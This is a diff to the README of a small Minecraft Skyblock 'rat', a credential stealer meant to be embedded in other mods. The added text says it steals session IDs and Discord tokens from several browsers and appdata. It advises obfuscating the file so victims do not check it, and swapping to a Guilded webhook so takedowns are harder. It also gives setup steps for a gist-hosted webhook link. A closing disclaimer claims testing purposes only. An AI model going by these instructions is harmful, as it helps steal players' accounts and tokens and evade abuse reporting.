@@ -1,7 +1,15 @@
 # Skyblock-8Kb-Rat
 -------------------
-A small skyblock rat that I used to use back in 2021, descently small and can be imbeded into another mod without much issues.
 
+Info:
+A small skyblock rat that I used to use back in 2021, descently small and can be imbeded into another mod without much issues. The rat will grab ssid and discord info. The discord info is grabbed from browsers suck as: Chrome, Edge, Opera, Brave, and the appdata on the pc.
+
+As long as the file is obfuscated properly many sb players dont seem to check the link out as they are to scared.
+If you wanna improve this replace the discord webhook with a guilded webhook as they cant be nuked and have to reported directly to guilded's staff team in order for them to be taken down.
+
+
+
+# Usage
 
 To make a gist go to https://gist.github.com/:
 
@@ -17,6 +25,18 @@ Just add /raw on the end:
 
 
 And paste it into the webhook part of the file.
+
+
+
+
+
+# Disclaimer
+
+I, the creator am not responsible for anything you do with this software. This is intended to be used for testing purposes only and to demonstrate what kind of information a stealer can obtain from your minecraft account. Please do not use this program maliciously as I completely forbid this.
+
+
+
+
 
 
 
